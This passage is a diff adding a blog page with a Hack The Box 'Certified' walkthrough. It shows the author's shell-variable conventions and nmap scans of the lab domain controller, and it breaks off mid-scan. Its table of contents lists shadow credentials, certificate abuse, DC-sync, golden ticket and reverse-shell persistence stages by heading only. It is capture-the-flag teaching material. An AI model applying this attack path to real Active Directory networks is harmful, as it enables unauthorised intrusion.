@@ -1,0 +1,2438 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.137.1">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Certified HTB Walkthrough |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Certified HTB Walkthrough -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/administrator-box/" title="./administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Certified HTB Walkthrough
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.06.11"
+                            >2024.06.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        19 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/box/"
+                            class="tag-btn">
+                            Box
+                        </a>
+                    
+                        <a
+                            href="/tags/htb/"
+                            class="tag-btn">
+                            HTB
+                        </a>
+                    
+                        <a
+                            href="/tags/medium/"
+                            class="tag-btn">
+                            Medium
+                        </a>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/ldap/"
+                            class="tag-btn">
+                            LDAP
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/shadow-credentials/"
+                            class="tag-btn">
+                            Shadow Credentials
+                        </a>
+                    
+                        <a
+                            href="/tags/kerberos/"
+                            class="tag-btn">
+                            Kerberos
+                        </a>
+                    
+                        <a
+                            href="/tags/ca/"
+                            class="tag-btn">
+                            CA
+                        </a>
+                    
+                        <a
+                            href="/tags/whisker/"
+                            class="tag-btn">
+                            Whisker
+                        </a>
+                    
+                        <a
+                            href="/tags/msds-keycredentiallink/"
+                            class="tag-btn">
+                            MsDS-KeyCredentialLink
+                        </a>
+                    
+                        <a
+                            href="/tags/certificate/"
+                            class="tag-btn">
+                            CERTIFICATE
+                        </a>
+                    
+                        <a
+                            href="/tags/dacls/"
+                            class="tag-btn">
+                            DACLS
+                        </a>
+                    
+                        <a
+                            href="/tags/acl/"
+                            class="tag-btn">
+                            ACL
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
+    
+
+    
+        Walkthroughs
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/walkthroughs/certified-box/" class="bread-btn">
+    
+
+    
+        
+            Certified HTB Walkthrough
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#certified-hack-the-box-walkthrough-writeup">Certified Hack The Box Walkthrough/Writeup:</a></li>
+    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
+    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
+      <ul>
+        <li><a href="#assumed-breach-box">Assumed Breach Box:</a></li>
+        <li><a href="#nmap">NMAP:</a></li>
+        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
+        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
+        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-dot-foothold">2. Foothold:</a>
+      <ul>
+        <li><a href="#enumerating-as-judith">Enumerating as Judith:</a></li>
+        <li><a href="#discovering-our-user-has-genericwrite-privs-over-management-svc">Discovering our user has GenericWrite privs over MANAGEMENT_SVC:</a></li>
+        <li><a href="#planning-our-attack-path">Planning our attack path:</a></li>
+        <li><a href="#making-judith-owner-of-the-management-group-and-then-adding-her-as-a-user">Making Judith owner of the Management group &amp; then adding her as a user:</a></li>
+        <li><a href="#performing-the-shadow-credentials-attack-against-management-svc">Performing the shadow credentials attack against &ldquo;MANAGEMENT_SVC&rdquo;:</a></li>
+        <li><a href="#logging-in-as-management-svc">Logging in as MANAGEMENT_SVC:</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-dot-lateral-movement">3. Lateral Movement:</a>
+      <ul>
+        <li><a href="#discovering-that-management-svc-has-genericall-over-ca-operator">Discovering that MANAGEMENT_SVC has GenericAll over CA_OPERATOR:</a></li>
+        <li><a href="#performing-the-shadow-credentials-attack-against-ca-operator">Performing the shadow credentials attack against &ldquo;CA_OPERATOR&rdquo;</a></li>
+        <li><a href="#requesting-a-tgt-ca-operator-for-with-pkinittools-getgtgkinit">Requesting a TGT for CA_OPERATOR with PKINITtools getgtgkinit:</a></li>
+        <li><a href="#requesting-the-ca-operator-user-hash-with-pkinittools-getnthash">Requesting the CA_OPERATOR user hash with PKINITtools getnthash:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-privilege-escalation">4. Privilege Escalation:</a>
+      <ul>
+        <li><a href="#discovering-that-we-can-perform-the-esc9-exploit-chain-ca-vulnerability-as-ca-operator">Discovering that we can perform the ESC9 exploit chain CA vulnerability as CA_OPERATOR:</a></li>
+        <li><a href="#esc9-privilege-escalation">ESC9 Privilege Escalation:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-dot-persistence">5. Persistence:</a>
+      <ul>
+        <li><a href="#dumping-ntds-dot-dit-dc-sync-attack">Dumping NTDS.dit/DC-SYNC attack:</a></li>
+        <li><a href="#creating-a-kerberos-golden-ticket">Creating a Kerberos Golden Ticket:</a></li>
+        <li><a href="#using-a-base64-encoded-powershell-reverse-shell-and-download-cradle-to-connect-back-to-our-attack-host-every-1-minute">Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host every 1 minute:</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned">Lessons Learned:</a>
+      <ul>
+        <li><a href="#what-did-i-learn">What did I learn?</a></li>
+        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
+      </ul>
+    </li>
+    <li><a href="#sign-off">Sign off:</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="certified-hack-the-box-walkthrough-writeup">Certified Hack The Box Walkthrough/Writeup:</h2>
+<ul>
+<li><a href="https://app.hackthebox.com/machines/Certified">https://app.hackthebox.com/machines/Certified</a></li>
+</ul>
+<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
+<ul>
+<li>
+<p><strong>Variables</strong>:</p>
+<ul>
+<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
+<ul>
+<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
+<ul>
+<li><code>$box</code> = The IP of the box</li>
+<li><code>$pass</code> = Passwords I have access to.</li>
+<li><code>$user</code> = current user I am enumerating with.
+<ul>
+<li>Depending on where I am in the process this can change if I move laterally.</li>
+</ul>
+</li>
+<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
+<li><code>$machine</code> = the machine name e.g. <code>DC01</code></li>
+</ul>
+</li>
+<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Wordlists</strong>:</p>
+<ul>
+<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
+<ul>
+<li>I also use these additional wordlists:
+<ul>
+<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
+<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-dot-enumeration">1. Enumeration:</h2>
+<h3 id="assumed-breach-box">Assumed Breach Box:</h3>
+<ul>
+<li>This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.</li>
+<li>This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.</li>
+<li>+Note+:
+<ul>
+<li>Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
+<ul>
+<li>This ensures I don’t overlook any findings just because access is available.</li>
+<li>Comprehensive documentation of all discoveries remains essential.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="nmap">NMAP:</h3>
+<h4 id="basic-scans">Basic Scans:</h4>
+<ul>
+<li><strong>Basic TCP Scan</strong>:
+<ul>
+<li><code>nmap $box -Pn -oA TCPbasicScan</code>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Certified/scans/nmap%20%20%f0%9f%8d%a3%20main%20%201GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2007:59:52%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20TCPbasicScan%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-06%2007:59%20GMT%0aNmap%20scan%20report%20for%2010.129.107.1%0aHost%20is%20up%20%280.043s%20latency%29.%0aNot%20shown:%20989%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20STATE%20SERVICE%0a53/tcp%20%20%20open%20%20domain%0a88/tcp%20%20%20open%20%20kerberos-sec%0a135/tcp%20%20open%20%20msrpc%0a139/tcp%20%20open%20%20netbios-ssn%0a389/tcp%20%20open%20%20ldap%0a445/tcp%20%20open%20%20microsoft-ds%0a464/tcp%20%20open%20%20kpasswd5%0a593/tcp%20%20open%20%20http-rpc-epmap%0a636/tcp%20%20open%20%20ldapssl%0a3268/tcp%20open%20%20globalcatLDAP%0a3269/tcp%20open%20%20globalcatLDAPssl%0a%0aNmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%204.46%20seconds">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Certified/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 07:59:52 zsh ❯ nmap $box -Pn -oA TCPbasicScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-06 07:59 GMT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.107.1
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.043s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp   open  domain
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 4.46 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Initial thoughts</strong>:
+<ul>
+<li>DNS, Kerberos, SMB, Ldap &amp; RPC all good means of enumeration.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="comprehensive-scans">Comprehensive Scans:</h4>
+<ul>
+<li>
+<p><strong>In depth scan TCP</strong>:</p>
+<ul>
+<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code></li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Certified/scans/nmap%20%20%f0%9f%8d%a3%20main%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2015:06:16%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a[sudo]%20password%20for%20kali:%0aStarting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-11-06%2015:06%20GMT%0aNmap%20scan%20report%20for%20certified.htb%20%2810.129.107.1%29%0aHost%20is%20up%20%280.039s%20latency%29.%0aNot%20shown:%2065514%20filtered%20tcp%20ports%20%28no-response%29%0aPORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a53/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a88/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-11-06%2015:08:29Z%29%0a135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20certified.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.certified.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.certified.htb%0a%7c%20Not%20valid%20before:%202024-05-13T15:49:36%0a%7c_Not%20valid%20after:%20%202025-05-13T15:49:36%0a%7c_ssl-date:%202024-11-06T15:10:01&#43;00:00;%200s%20from%20scanner%20time.%0a445/tcp%20%20%20open%20%20microsoft-ds?%0a464/tcp%20%20%20open%20%20kpasswd5?%0a593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a636/tcp%20%20%20open%20%20ssl/ldap%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20certified.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c_ssl-date:%202024-11-06T15:10:01&#43;00:00;%200s%20from%20scanner%20time.%0a%7c%20ssl-cert:%20Subject:%20commonName=DC01.certified.htb%0a%7c%20Subject%20Alternative%20Name:%20othername:%201.3.6.1.4.1.311.25.1::%3cunsupported%3e,%20DNS:DC01.certified.htb%0a%7c%20Not%20valid%20before:%202024-05-13T15:49:36%0a%7c_Not%20valid%20after:%20%202025-05-13T15:49:36%0a3268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20certified.htb0.,%20Site:%20Default-First-Site-Name%29%0a%7c%20ssl-c